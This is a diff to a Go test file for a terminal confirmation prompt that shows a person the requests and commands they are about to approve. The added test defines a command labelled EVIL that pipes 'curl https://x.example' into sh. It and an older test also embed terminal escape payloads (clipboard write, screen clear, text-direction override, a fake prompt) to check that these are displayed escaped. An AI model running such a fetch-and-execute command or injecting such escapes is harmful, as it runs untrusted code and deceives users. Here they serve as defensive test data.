@@ -12,6 +12,7 @@ import (
 	"time"
 
 	"github.com/vidforull/vegtam/internal/core"
+	"github.com/vidforull/vegtam/internal/core/env"
 )
 
 // person is a Terminal whose person answers each question with what
@@ -99,7 +100,7 @@ func TestAsk(t *testing.T) {
 			term := &person{answer: typing(tc.typ)}
 			a := &Asker{Term: term}
 			p, bs := prepared()
-			err := a.Ask(t.Context(), peer, p, bs)
+			err := a.Ask(t.Context(), peer, p, bs, nil)
 			switch {
 			case tc.want == "" && err != nil:
 				t.Fatalf("error %v", err)
@@ -122,7 +123,7 @@ func TestAskCase(t *testing.T) {
 	for {
 		term := &person{answer: typing(strings.ToUpper)}
 		p, bs := prepared()
-		err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs)
+		err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs, nil)
 		if code := codeOf(term.output()); strings.ToUpper(code) == code {
 			continue // digits alone: try another
 		}
@@ -140,7 +141,7 @@ func TestAskQuestion(t *testing.T) {
 		core.Bound{Name: "{{sid}}", Allowed: nil, Capture: true},
 		core.Bound{Name: "{{key}}", Origin: "https://api.example"},
 	)
-	if err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs); err != nil {
+	if err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs, nil); err != nil {
 		t.Fatal(err)
 	}
 	out := term.output()
@@ -170,7 +171,7 @@ func TestAskEscapes(t *testing.T) {
 	term := &person{answer: typing(func(c string) string { return c })}
 	p := &core.Prepared{Method: "GET\x1b[2J", URL: core.Text{{Text: "https://a.example/\x1b]52;c;cHduZWQ=\x07\nType zzzz\t\u202e"}}}
 	sly := Peer{UID: 501, PID: 7, Name: "x\x1b[31m"}
-	if err := (&Asker{Term: term}).Ask(t.Context(), sly, p, nil); err != nil {
+	if err := (&Asker{Term: term}).Ask(t.Context(), sly, p, nil, nil); err != nil {
 		t.Fatal(err)
 	}
 	out := term.output()
@@ -187,6 +188,42 @@ func TestAskEscapes(t *testing.T) {
 	}
 }
 
+// TestAskCommands checks that the question shows each command that the
+// request runs, whole, with its file, and with what a command file says
+// escaped: the person trusted the file, but a program may have written it.
+func TestAskCommands(t *testing.T) {
+	term := &person{answer: typing(func(c string) string { return c })}
+	p := &core.Prepared{Method: "GET", URL: core.Text{{Text: "https://api.example/?k="}, {Secret: &core.Secret{Name: "$cmd KEY"}}}}
+	bs := []core.Bound{{Name: "{{$cmd KEY}}", Origin: "https://api.example", Allowed: []string{"https://api.example"}}}
+	cmds := []env.NamedCommand{
+		{Name: "KEY", File: "/w/http-client.cmd.json", Path: "/usr/bin/op", Argv: []string{"op", "read", "op://vault/api key"}},
+		{Name: "EVIL", File: "/w/http-client.cmd.json", Argv: []string{
+			"sh", "-c", "curl -s https://x.example | sh\n\x1b[2J\x1b]52;c;cHduZWQ=\x07Type zzzz\t\u202e",
+		}},
+		{Name: "ID", File: "/w/sub\x1b[31m/http-client.cmd.json", Argv: []string{"./id"}},
+	}
+	if err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs, cmds); err != nil {
+		t.Fatal(err)
+	}
+	out := term.output()
+	want := "  secret {{$cmd KEY}}, in the URL, goes to https://api.example: bound to it\n" +
+		"  command KEY: /usr/bin/op read 'op://vault/api key'\n" +
+		`  command EVIL: sh -c "curl -s https://x.example | sh\n\x1b[2J\x1b]52;c;cHduZWQ=\aType zzzz\t\u202e"` + "\n" +
+		"  from /w/http-client.cmd.json: they run here, as you, once you type the code\n" +
+		"  command ID: ./id\n" +
+		`  from "/w/sub\x1b[31m/http-client.cmd.json": it runs here, as you, once you type the code` + "\n" +
+		"To send it, type "
+	if !strings.Contains(out, want) {
+		t.Errorf("question:\n%s\nwant in it:\n%s", out, want)
+	}
+	if strings.ContainsAny(out, "\x1b\x07\t\u202e") {
+		t.Errorf("control characters reach the terminal: %q", out)
+	}
+	if n := strings.Count(out, "\n"); n != 11 {
+		t.Errorf("%d lines, want 11: %q", n, out)
+	}
+}
+
 func TestAskNoAnswer(t *testing.T) {
 	waits := func(ctx context.Context, _ string) (string, error) {
 		<-ctx.Done()
@@ -196,7 +233,7 @@ func TestAskNoAnswer(t *testing.T) {
 		term := &person{answer: waits}
 		p, bs := prepared()
 		start := time.Now()
-		err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs)
+		err := (&Asker{Term: term}).Ask(t.Context(), peer, p, bs, nil)
 		if err == nil || err.Error() != "no answer in 60s" {
 			t.Fatalf("error %v", err)
 		}
@@ -210,14 +247,14 @@ func TestAskNoAnswer(t *testing.T) {
 	t.Run("withdrawn", func(t *testing.T) {
 		ctx, cancel := context.WithCancelCause(t.Context())
 		cancel(errGone)
-		err := (&Asker{Term: &person{answer: waits}}).Ask(ctx, peer, &core.Prepared{}, nil)
+		err := (&Asker{Term: &person{answer: waits}}).Ask(ctx, peer, &core.Prepared{}, nil, nil)
 		if err == nil || !errors.Is(err, errGone) {
 			t.Errorf("error %v", err)
 		}
 	})
 	t.Run("end of input", func(t *testing.T) {
 		eof := func(context.Context, string) (string, error) { return "", io.EOF }
-		err := (&Asker{Term: &person{answer: eof}}).Ask(t.Context(), peer, &core.Prepared{}, nil)
+		err := (&Asker{Term: &person{answer: eof}}).Ask(t.Context(), peer, &core.Prepared{}, nil, nil)
 		if err == nil || err.Error() != "no answer: the terminal's input has ended" {
 			t.Errorf("error %v", err)
 		}
@@ -246,7 +283,7 @@ func TestAskOneAtATime(t *testing.T) {
 		for range 3 {
 			wg.Go(func() {
 				p, bs := prepared()
-				if err := a.Ask(t.Context(), peer, p, bs); err != nil {
+				if err := a.Ask(t.Context(), peer, p, bs, nil); err != nil {
 					t.Error(err)
 				}
 			})
